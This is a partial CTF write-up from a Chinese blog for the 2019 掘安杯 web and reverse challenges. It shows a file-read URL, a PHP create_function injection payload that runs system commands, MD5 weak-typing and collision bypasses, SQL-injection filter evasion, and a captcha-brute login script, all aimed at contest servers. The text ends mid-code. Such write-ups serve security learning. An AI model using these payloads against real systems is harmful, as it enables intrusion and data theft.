<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019年掘安杯部分wp - 一筐萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> 你若盛开，清风自来！ </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>一筐萝卜</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web签到"><span class="toc-text">web签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jactf-jasafe110qweasdzxc"><span class="toc-text">jactf{jasafe110qweasdzxc}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站被黑"><span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载下载"><span class="toc-text">下载下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#myCTF-cssohw456954GUEB"><span class="toc-text">myCTF{cssohw456954GUEB}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-easy"><span class="toc-text">not_easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#audit"><span class="toc-text">audit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-jactf-c795359da56ae38ec9132eaad24733fc"><span class="toc-text">flag:jactf{c795359da56ae38ec9132eaad24733fc}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#曲折的人生"><span class="toc-text">曲折的人生</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：flag-Good-luck"><span class="toc-text">flag：flag{Good luck!}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse-签到"><span class="toc-text">reverse 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re-easy"><span class="toc-text">re_easy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-bdctf-YOU-CRAKE-THE-RC4"><span class="toc-text">flag: bdctf{YOU_CRAKE_THE_RC4}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-reverse"><span class="toc-text">baby_reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：jactf-w0w-is-flag"><span class="toc-text">flag：jactf{w0w_is_flag}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py"><span class="toc-text">py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-3bc94420543503a331632867d3cdd82"><span class="toc-text">flag:3bc94420543503a331632867d3cdd82</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE-crypto"><span class="toc-text">RE_crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3"><span class="toc-text">flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypt"><span class="toc-text">encrypt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jactf-122333-Pangolin"><span class="toc-text">jactf{122333_Pangolin}</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019年掘安杯部分wp
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-04-08 23:42:42</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content no-indent">
        <p>还差点</p>
<a id="more"></a>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>打开页面后发现一个超链接，查看源代码发现是跳转到flag.php的，点击超链接之后发现又跳转到了404.php，那么我们在中间抓包，发现加密的flag，base64解密即可</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A5wXsf.png" alt> </p>
<h4 id="jactf-jasafe110qweasdzxc"><a href="#jactf-jasafe110qweasdzxc" class="headerlink" title="jactf{jasafe110qweasdzxc}"></a>jactf{jasafe110qweasdzxc}</h4><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>bugku原题</p>
<h3 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h3><p>查看源代码发现提示下载flag.php，直接在url上添加</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//120.79.1.69:10002/?file=flag.php</span></span><br></pre></td></tr></table></figure>

<p>flag.php中是一个加密函数和一个解密函数，key和密文已经给出，直接调用解密函数即可</p>
<h4 id="myCTF-cssohw456954GUEB"><a href="#myCTF-cssohw456954GUEB" class="headerlink" title="myCTF{cssohw456954GUEB}"></a>myCTF{cssohw456954GUEB}</h4><h3 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h3><p>也是一个原题，通过匿名函数和闭合括号可以造成任意代码执行</p>
<p>payload</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">120.79</span>.<span class="number">1.69</span>:<span class="number">10006</span>/?action=\create_function&amp;arg=)&#123;&#125;<span class="keyword">system</span>(%22ls%22);<span class="regexp">/*</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/120.79.1.69:10006/</span>?action=\create_function&amp;arg=)&#123;&#125;<span class="keyword">system</span>(%22cat%20Th1s_1S_F1a9_Hav3_Fun%22);<span class="regexp">/*</span></span><br></pre></td></tr></table></figure>

<h3 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h3><p>代码审计题：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>)) </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>)) </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str8 = hash(<span class="string">'md5'</span>, $a, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$str9 = strtr(hash(<span class="string">'md5'</span>, $b, <span class="keyword">false</span>), $m, $n);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str8 : $str8&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str9 : $str9&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">6</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"You're great,give you flag:"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">str1 <span class="keyword">OR</span> Sstr2 no no no</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第一步利用弱类型可以绕过</li>
<li>第二步可以利用数组来绕过</li>
<li>第三步可以利用md5相同的文件来绕过<br><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">利用工具</a></li>
<li>最后一步也可以利用弱类型老绕过</li>
</ul>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strtr(<span class="built_in">string</span>,<span class="keyword">from</span>,<span class="keyword">to</span>)</span><br><span class="line">把<span class="built_in">string</span>字符串中的<span class="keyword">from</span>的每一个字符替换成相应的<span class="keyword">to</span>字符</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$a=<span class="string">"aaaabbbb"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">$b = strtr($a,<span class="string">"a"</span>, <span class="string">"1"</span>);</span></span><br><span class="line"><span class="php"> <span class="keyword">echo</span> $b.<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">页面输出：</span><br><span class="line">aaaabbbb</span><br><span class="line">1111bbbb</span><br></pre></td></tr></table></figure>

<p>首先生成一个只含有2个字母的md5值并且是0e开头的并且是6位数字加密的</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">999999</span>):</span><br><span class="line">  <span class="keyword">if</span> md5(<span class="built_in">str</span>(i))[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'a'</span> <span class="built_in">not</span> <span class="built_in">in</span> md5(<span class="built_in">str</span>(i))[<span class="number">2</span>:]:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">'b'</span> <span class="built_in">not</span> <span class="built_in">in</span> md5(<span class="built_in">str</span>(i))[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'e'</span> <span class="built_in">not</span> <span class="built_in">in</span> md5(<span class="built_in">str</span>(i))[<span class="number">2</span>:]:</span><br><span class="line">          <span class="keyword">if</span> <span class="string">'f'</span> <span class="built_in">not</span> <span class="built_in">in</span> md5(<span class="built_in">str</span>(i))[<span class="number">2</span>:]:</span><br><span class="line">            print i</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">out：<span class="number">988370</span></span><br></pre></td></tr></table></figure>

<p>getflag：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">def md5(str):</span><br><span class="line">  p= hashlib.md5(str).hexdigest()</span><br><span class="line">  <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999</span>):</span><br><span class="line">  <span class="keyword">if</span> md5(str(i))[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> md5(str(i))[<span class="number">2</span>:]:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> md5(str(i))[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">not</span> <span class="keyword">in</span> md5(str(i))[<span class="number">2</span>:]:</span><br><span class="line">          <span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">not</span> <span class="keyword">in</span> md5(str(i))[<span class="number">2</span>:]:</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=cd&amp;n=12"</span></span><br><span class="line">data1 = <span class="built_in">open</span>(<span class="string">'./out_test_028.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()</span><br><span class="line">data2 = <span class="built_in">open</span>(<span class="string">'./out_test_029.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()</span><br><span class="line">data3 = <span class="built_in">open</span>(<span class="string">'./out_test_030.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()</span><br><span class="line">data= &#123;</span><br><span class="line">  <span class="string">'str5'</span>:data1,</span><br><span class="line">  <span class="string">'str6'</span>:data2,</span><br><span class="line">  <span class="string">'str7'</span>:data3,</span><br><span class="line">  <span class="string">'a'</span>:<span class="string">'QNKCDZO'</span>,</span><br><span class="line">  <span class="string">'b'</span>:<span class="string">'988370'</span></span><br><span class="line">&#125;</span><br><span class="line">r= requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>

<h4 id="flag-jactf-c795359da56ae38ec9132eaad24733fc"><a href="#flag-jactf-c795359da56ae38ec9132eaad24733fc" class="headerlink" title="flag:jactf{c795359da56ae38ec9132eaad24733fc}"></a>flag:jactf{c795359da56ae38ec9132eaad24733fc}</h4><h3 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h3><p>进过测试发现用户名和处存在sql注入，过滤了空格、select、union、or，我们可以进行双写绕过<br><img src="https://s2.ax1x.com/2019/04/08/A5wjL8.png" alt><br><img src="https://s2.ax1x.com/2019/04/08/A5wxeS.png" alt><br>得到username和password</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goodboy_g<span class="number">-60</span>Hellowor</span><br><span class="line">ajahas&amp;&amp;*<span class="number">44</span>askldajaj</span><br></pre></td></tr></table></figure>

<p>登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过，验证码需要3秒内提交，所以需要python脚本来跑</p>
<p>脚本：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10005/index.php?check"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	conn= requests.session()</span><br><span class="line">	res = conn.<span class="builtin-name">get</span>(url)</span><br><span class="line">	res_text = res.text</span><br><span class="line">	bs_res = BeautifulSoup(res_text,<span class="string">"lxml"</span>)	</span><br><span class="line"></span><br><span class="line">	a = str(bs_res.find_all(<span class="attribute">name</span>=<span class="string">'div'</span>,attrs=&#123;<span class="string">"class"</span>:<span class="string">"rep"</span>&#125;)).replace(<span class="string">"\\uff08"</span>,<span class="string">"("</span>).replace(<span class="string">"\\uff09"</span>,<span class="string">")"</span>).replace(<span class="string">"X"</span>,<span class="string">"*"</span>)[18:-7]</span><br><span class="line">	<span class="builtin-name">print</span> a</span><br><span class="line">	num = eval(a)	</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"username"</span>:<span class="string">"goodboy_g-60Hellowoorr"</span>,</span><br><span class="line">		<span class="string">"password"</span>:<span class="string">"ajahas&amp;&amp;*44askldajaj"</span>,</span><br><span class="line">		<span class="string">"code"</span>:num</span><br><span class="line">	&#125;</span><br><span class="line">	end_res = conn.post(url,data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"验证码不正确"</span> <span class="keyword">not</span> <span class="keyword">in</span> end_res.content:</span><br><span class="line">		<span class="builtin-name">print</span> end_res.content</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

<p>提交之后可以发现有一个zip压缩包的链接，压缩包密码已给出：<br><img src="https://s2.ax1x.com/2019/04/08/A5wzdg.png" alt> </p>
<p>解压之后还有一个压缩包和一个txt文档：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Function</span> getPassword(<span class="keyword">ByVal</span> str As <span class="built_in">String</span>) As <span class="built_in">String</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> reString As <span class="built_in">String</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> i As Integer</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">While</span> (i &lt;= <span class="built_in">Len</span>(str))</span><br><span class="line">    </span><br><span class="line">     reString = reString &amp; <span class="built_in">Mid</span>(str, i, <span class="number">1</span>)</span><br><span class="line">     i = i + (i Mod <span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Wend</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    getPassword = reString</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Command1_Click()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Dim</span> Dictionary As <span class="built_in">String</span></span><br><span class="line">    </span><br><span class="line">   Dictionary = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">Dim</span> password As <span class="built_in">String</span></span><br><span class="line">   </span><br><span class="line">   password = getPassword(Dictionary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">Dim</span> psw As <span class="built_in">String</span></span><br><span class="line">   </span><br><span class="line">   psw = Text1.Text</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   <span class="keyword">If</span> (psw = password) <span class="keyword">Then</span></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">MsgBox</span> <span class="string">"The password is correct!"</span>, vbOKOnly, <span class="string">"密码正确"</span></span><br><span class="line">    </span><br><span class="line">    Text1.Text = <span class="string">"Password for next pass : "</span> &amp; getPassword(password)</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">Else</span></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">MsgBox</span> 